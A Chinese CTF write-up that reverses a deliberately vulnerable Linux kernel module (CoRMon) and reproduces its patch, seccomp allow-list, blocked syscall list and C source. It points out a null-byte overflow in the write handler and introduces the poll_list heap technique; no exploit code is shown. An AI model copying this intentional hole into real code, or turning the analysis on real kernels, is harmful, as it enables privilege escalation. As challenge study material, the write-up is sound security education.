<p>除此之外，smallkirby师傅的博客中推荐了一下其自行实现的一个<a target="_blank" rel="noopener" href="https://github.com/smallkirby/lysithea">小工具</a>，它可以更加方便我们的内核环境的相关信息获取虽然本人并没有在本题来使用他，这里先记录一下</p>
<h1 id="0x01-漏洞模块逆向"><a href="#0x01-漏洞模块逆向" class="headerlink" title="0x01 漏洞模块逆向"></a>0x01 漏洞模块逆向</h1><h2 id="1-杂项"><a href="#1-杂项" class="headerlink" title="1.杂项"></a>1.杂项</h2><p>在题目所给文件当中给出了 <code>build/kernel/patch</code>文件</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs diff">diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c<br><span class="hljs-comment">--- a/arch/x86/entry/syscall_64.c	2022-06-29 08:59:54.000000000 +0200</span><br><span class="hljs-comment">+++ b/arch/x86/entry/syscall_64.c	2022-07-02 12:34:11.237778657 +0200</span><br><span class="hljs-meta">@@ -17,6 +17,9 @@</span><br> <br> #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,<br> <br><span class="hljs-addition">+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);</span><br><span class="hljs-addition">+EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);</span><br><span class="hljs-addition">+</span><br> asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = &#123;<br> 	/*<br> 	 * Smells like a compiler bug -- it doesn&#x27;t work<br>diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h<br><span class="hljs-comment">--- a/arch/x86/include/asm/syscall_wrapper.h	2022-06-29 08:59:54.000000000 +0200</span><br><span class="hljs-comment">+++ b/arch/x86/include/asm/syscall_wrapper.h	2022-07-02 12:34:11.237778657 +0200</span><br><span class="hljs-meta">@@ -245,7 +245,7 @@</span><br>  * SYSCALL_DEFINEx() -- which is essential for the COND_SYSCALL() and SYS_NI()<br>  * macros to work correctly.<br>  */<br><span class="hljs-deletion">-#define SYSCALL_DEFINE0(sname)						\</span><br><span class="hljs-addition">+#define __SYSCALL_DEFINE0(sname)						\</span><br> 	SYSCALL_METADATA(_##sname, 0);					\<br> 	static long __do_sys_##sname(const struct pt_regs *__unused);	\<br> 	__X64_SYS_STUB0(sname)						\<br>diff -ruN a/include/linux/syscalls.h b/include/linux/syscalls.h<br><span class="hljs-comment">--- a/include/linux/syscalls.h	2022-06-29 08:59:54.000000000 +0200</span><br><span class="hljs-comment">+++ b/include/linux/syscalls.h	2022-07-02 12:34:11.237778657 +0200</span><br><span class="hljs-meta">@@ -82,6 +82,7 @@</span><br> #include &lt;linux/key.h&gt;<br> #include &lt;linux/personality.h&gt;<br> #include &lt;trace/syscall.h&gt;<br><span class="hljs-addition">+#include &lt;asm/syscall.h&gt;</span><br> <br> #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER<br> /*<br><span class="hljs-meta">@@ -202,8 +203,8 @@</span><br> &#125;<br> #endif<br> <br><span class="hljs-deletion">-#ifndef SYSCALL_DEFINE0</span><br><span class="hljs-deletion">-#define SYSCALL_DEFINE0(sname)					\</span><br><span class="hljs-addition">+#ifndef __SYSCALL_DEFINE0</span><br><span class="hljs-addition">+#define __SYSCALL_DEFINE0(sname)					\</span><br> 	SYSCALL_METADATA(_##sname, 0);				\<br> 	asmlinkage long sys_##sname(void);			\<br> 	ALLOW_ERROR_INJECTION(sys_##sname, ERRNO);		\<br><span class="hljs-meta">@@ -219,9 +220,41 @@</span><br> <br> #define SYSCALL_DEFINE_MAXARGS	6<br> <br><span class="hljs-deletion">-#define SYSCALL_DEFINEx(x, sname, ...)				\</span><br><span class="hljs-deletion">-	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\</span><br><span class="hljs-deletion">-	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)</span><br><span class="hljs-addition">+DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \</span><br><span class="hljs-addition">+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define __SYSCALL_COUNT(syscall_nr) \</span><br><span class="hljs-addition">+	this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_COUNT_FUNCx(sname, x, ...)					\</span><br><span class="hljs-addition">+	&#123;									\</span><br><span class="hljs-addition">+		__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);		\</span><br><span class="hljs-addition">+		return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));	\</span><br><span class="hljs-addition">+	&#125;									\</span><br><span class="hljs-addition">+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_COUNT_DECLARE0(sname) \</span><br><span class="hljs-addition">+	static inline long __count_sys_##sname(void);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_COUNT_FUNC0(sname)					\</span><br><span class="hljs-addition">+	&#123;								\</span><br><span class="hljs-addition">+		__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);	\</span><br><span class="hljs-addition">+		return __count_sys_##sname();				\</span><br><span class="hljs-addition">+	&#125;								\</span><br><span class="hljs-addition">+	static inline long __count_sys_##sname(void)</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_DEFINEx(x, sname, ...)			\</span><br><span class="hljs-addition">+	SYSCALL_METADATA(sname, x, __VA_ARGS__)		\</span><br><span class="hljs-addition">+	SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)	\</span><br><span class="hljs-addition">+	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)	\</span><br><span class="hljs-addition">+	SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_DEFINE0(sname)		\</span><br><span class="hljs-addition">+	SYSCALL_COUNT_DECLARE0(sname)	\</span><br><span class="hljs-addition">+	__SYSCALL_DEFINE0(sname)	\</span><br><span class="hljs-addition">+	SYSCALL_COUNT_FUNC0(sname)</span><br> <br>.......<br><br></code></pre></td></tr></table></figure>

<p>着眼于该行，</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">+<span class="hljs-constructor">DEFINE_PER_CPU(<span class="hljs-params">u64</span> [NR_syscalls], <span class="hljs-params">__per_cpu_syscall_count</span>)</span>;<br></code></pre></td></tr></table></figure>

<p>他会为每个CPU都创建一个 <code>__per_cpu_syscall_count</code>变量用来记录系统调用的次数，具体功能可以参考该篇<a target="_blank" rel="noopener" href="https://xinqiu.gitbooks.io/linux-insides-cn/content/Concepts/linux-cpu-1.html">文章</a></p>
<p>还记得最开始出题人所给出的 <code>README.md</code>吗，我们此时可以使用一下他来看看</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fccc48b7f9ba039245d688214e.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看到其中包含了使用到的系统调用在各个CPU当中的情况，这里暗含的一点就是 <code>D3v17</code>大师给予我们的一个漏洞利用即将用到的系统调用的小提示，可以看到截至目前被使用到的系统调用共有 <code>sys_poll,sys_execve,sys_setxattr,sys_keyctl</code></p>
<p>若按步骤传递字符串之后效果如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c8701f87df3d2617f9e2f0708ff3f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里给出之前我们提到的过滤规则</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>	<span class="hljs-string">&quot;defaultAction&quot;</span>: <span class="hljs-string">&quot;SCMP_ACT_ERRNO&quot;</span>,<br>	<span class="hljs-string">&quot;defaultErrnoRet&quot;</span>: <span class="hljs-number">1</span>,<br>	<span class="hljs-string">&quot;syscalls&quot;</span>: [<br>		&#123;<br>			<span class="hljs-string">&quot;names&quot;</span>: [ <span class="hljs-string">&quot;_llseek&quot;</span>, <span class="hljs-string">&quot;_newselect&quot;</span>, <span class="hljs-string">&quot;accept&quot;</span>, <span class="hljs-string">&quot;accept4&quot;</span>, <span class="hljs-string">&quot;access&quot;</span>, <span class="hljs-string">&quot;add_key&quot;</span>,&lt;...&gt; ],<br>			<span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;SCMP_ACT_ALLOW&quot;</span><br>		&#125;,<br>		&#123;<br>			<span class="hljs-string">&quot;names&quot;</span>: [ <span class="hljs-string">&quot;clone&quot;</span> ],<br>			<span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;SCMP_ACT_ALLOW&quot;</span>,<br>			<span class="hljs-string">&quot;args&quot;</span>: [ &#123; <span class="hljs-string">&quot;index&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-number">2114060288</span>, <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-string">&quot;SCMP_CMP_MASKED_EQ&quot;</span> &#125; ]<br>		&#125;<br>	]<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这里有很多，是个白名单，我就也不全部贴出，下面是 <code>smallkirby</code>师傅整理出来的部分被禁止的系统调用，其中 <code>msg*</code>系列异常显眼</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">msgget<br>msgsnd<br>msgrcv<br>msgctl<br>ptrace<br>syslog<br>uselib<br>personality<br>ustat<br>sysfs<br>vhangup<br>pivot_root<br>_sysctl<br>chroot<br>acct<br>settimeofday<br>mount<br>umount2<br><span class="hljs-keyword">swapon</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">swapoff</span><br><span class="hljs-keyword"></span>reboot<br>sethostname<br>setdomainname<br>iopl<br>ioperm<br>create_module<br>init_module<br>delete_module<br>get_kernel_syms<br>query_module<br>quotactl<br>nfsservctl<br>getpmsg<br>putpmsg<br>afs_syscall<br>tuxcall<br>security<br>lookup_dcookie<br><span class="hljs-keyword">clock_settime</span><br><span class="hljs-keyword"></span>vserver<br>mbind<br>set_mempolicy<br>get_mempolicy<br>mq_open<br>mq_unlink<br>mq_timedsend<br>mq_timedreceive<br>mq_notify<br>mq_getsetattr<br>kexec_load<br>request_key<br>migrate_pages<br>unshare<br><span class="hljs-keyword">move_pages</span><br><span class="hljs-keyword"></span>perf_event_open<br>fanotify_init<br>name_to_handle_at<br>open_by_handle_at<br>setns<br>process_vm_readv<br>process_vm_writev<br>kcmp<br>finit_module<br>kexec_file_load<br><span class="hljs-keyword">bpf</span><br><span class="hljs-keyword"></span>userfaultfd<br>pkey_mprotect<br>pkey_alloc<br>pkey_free<br></code></pre></td></tr></table></figure>



<h2 id="2-漏洞模块"><a href="#2-漏洞模块" class="headerlink" title="2.漏洞模块"></a>2.漏洞模块</h2><p>这里 <code>D3v17</code>师傅已经在博客当中给出了源码，十分贴心，接下来我们逐步来进行逆向</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">init_procfs</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[CoRMon::Init] Initializing module...\n&quot;</span>);<br><br>    cormon = proc_create(<span class="hljs-string">&quot;cormon&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;cormon_proc_ops);<br><br>    <span class="hljs-keyword">if</span> (!cormon)<br>    &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[CoRMon::Error] proc_create() call failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (update_filter(initial_filter))<br>        <span class="hljs-keyword">return</span> -EINVAL;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[CoRMon::Init] Initialization complete!\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">cormon_proc_ops</span> =</span> &#123;<br>    .proc_open  = cormon_proc_open,<br>    .proc_read  = seq_read,<br>    .proc_write = cormon_proc_write<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> initial_filter[] = <span class="hljs-string">&quot;sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv&quot;</span>                    <br>                                <span class="hljs-string">&quot;sys_msgsnd,sys_poll,sys_ptrace,sys_setxattr,sys_unshare&quot;</span>;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">update_filter</span><span class="hljs-params">(<span class="hljs-type">char</span> *syscalls)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> new_filter[NR_syscalls] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">int</span> nr;<br><br>    <span class="hljs-keyword">while</span> ((name = strsep(&amp;syscalls, <span class="hljs-string">&quot;,&quot;</span>)) != <span class="hljs-literal">NULL</span> || syscalls != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        nr = get_syscall_nr(name);<br><br>        <span class="hljs-keyword">if</span> (nr &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[CoRMon::Error] Invalid syscall: %s!\n&quot;</span>, name);<br>            <span class="hljs-keyword">return</span> -EINVAL;<br>        &#125;<br><br>        new_filter[nr] = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(filter, new_filter, <span class="hljs-keyword">sizeof</span>(filter));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这里初始化部分很简单，首先创建 <code>/proc/cormon</code>进程，然后绑定了一个传入的函数表 <code>cormon_proc_ops</code>，其中具体实现我们之后细看，然后他会传入一个初始化的字符串，其中均是用 <code>,</code>隔离的系统调用名，调用我们的 <code>update_filter()</code>函数来更新一个全局过滤器 <code>filter</code>,该过滤器记录了我们使用 <code>cat /proc/cormon_rw</code>所显示的系统调用</p>
<h3 id="cormon-proc-open"><a href="#cormon-proc-open" class="headerlink" title="cormon_proc_open"></a>cormon_proc_open</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">cormon_proc_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span>  file *file)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> seq_open(file, &amp;cormon_seq_ops);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">cormon_seq_ops</span> =</span> &#123;<br>    .start  = cormon_seq_start,<br>    .next   = cormon_seq_next,<br>    .stop   = cormon_seq_stop,<br>    .show   = cormon_seq_show<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>Nothing special….</p>
<h3 id="cormon-proc-write"><a href="#cormon-proc-write" class="headerlink" title="cormon_proc_write"></a>cormon_proc_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">cormon_proc_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *ubuf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos)</span> <br>&#123;<br>    <span class="hljs-type">loff_t</span> offset = *ppos;<br>    <span class="hljs-type">char</span> *syscalls;<br>    <span class="hljs-type">size_t</span> len;<br><br>    <span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> -EINVAL;<br><br>    <span class="hljs-keyword">if</span> (offset &gt;= PAGE_SIZE || !count)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    len = count &gt; PAGE_SIZE ? PAGE_SIZE - <span class="hljs-number">1</span> : count;<br><br>    syscalls = kmalloc(PAGE_SIZE, GFP_ATOMIC);<br>    printk(KERN_INFO <span class="hljs-string">&quot;[CoRMon::Debug] Syscalls @ %#llx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)syscalls);<br><br>    <span class="hljs-keyword">if</span> (!syscalls)<br>    &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[CoRMon::Error] kmalloc() call failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_from_user(syscalls, ubuf, len))<br>    &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[CoRMon::Error] copy_from_user() call failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br><br>    syscalls[len] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (update_filter(syscalls))<br>    &#123;<br>        kfree(syscalls);<br>        <span class="hljs-keyword">return</span> -EINVAL;<br>    &#125;<br><br>    kfree(syscalls);<br><br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里可以看到有一个很明显的 <code>Null Byte</code>溢出，这里大概逻辑就是将我们传入的字符串首先复制到内核空间，这个空间通过 <code>kmalloc</code>获取一个4K大小的块，然后使用 <code>update_filter</code>函数来更新咱们的系统调用显示</p>
<h3 id="cormon-seq-start"><a href="#cormon-seq-start" class="headerlink" title="cormon_seq_start"></a>cormon_seq_start</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title">cormon_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *s, <span class="hljs-type">loff_t</span> *pos)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> *pos &gt; NR_syscalls ? <span class="hljs-literal">NULL</span> : pos;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在 <code>seq_read()</code>函数调用时会使用</p>
<h3 id="cormon-seq-next"><a href="#cormon-seq-next" class="headerlink" title="cormon_seq_next"></a>cormon_seq_next</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">cormon_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *s, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> (*pos)++ &gt; NR_syscalls ? <span class="hljs-literal">NULL</span> : pos;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="cormon-seq-stop"><a href="#cormon-seq-stop" class="headerlink" title="cormon_seq_stop"></a>cormon_seq_stop</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">cormon_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *s, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="cormon-seq-show"><a href="#cormon-seq-show" class="headerlink" title="cormon_seq_show"></a>cormon_seq_show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">cormon_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *s, <span class="hljs-type">void</span> *pos)</span><br>&#123;<br>    <span class="hljs-type">loff_t</span> nr = *(<span class="hljs-type">loff_t</span> *)pos;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">0</span>)<br>    &#123;<br>        seq_putc(s, <span class="hljs-string">&#x27;\n&#x27;</span>);<br><br>        for_each_online_cpu(i)<br>            seq_printf(s, <span class="hljs-string">&quot;%9s%d&quot;</span>, <span class="hljs-string">&quot;CPU&quot;</span>, i);<br><br>        seq_printf(s, <span class="hljs-string">&quot;\tSyscall (NR)\n\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (filter[nr])<br>    &#123;<br>        name = get_syscall_name(nr);<br><br>        <span class="hljs-keyword">if</span> (!name)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        for_each_online_cpu(i)<br>            seq_printf(s, <span class="hljs-string">&quot;%10llu&quot;</span>, per_cpu(__per_cpu_syscall_count, i)[nr]);<br><br>        seq_printf(s, <span class="hljs-string">&quot;\t%s (%lld)\n&quot;</span>, name, nr);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (nr == NR_syscalls)<br>        seq_putc(s, <span class="hljs-string">&#x27;\n&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该函数即为当我们使用 <code>cat /proc_rw/cormon</code>来显示该文件展现出的打印</p>
<p>而由于本题已经禁用了 <code>unshare</code> <code>msg*</code>等系统调用，所以我们平时十分常用的 <code>msg_msg</code>结构体也已经无法使用，接下来将会引入一个出题者在Google系统上使用到的一个特殊技术，那就是 <code>poll_list</code>，在这种情况下据出题人所述几乎有一个无限空间越界写的原语</p>
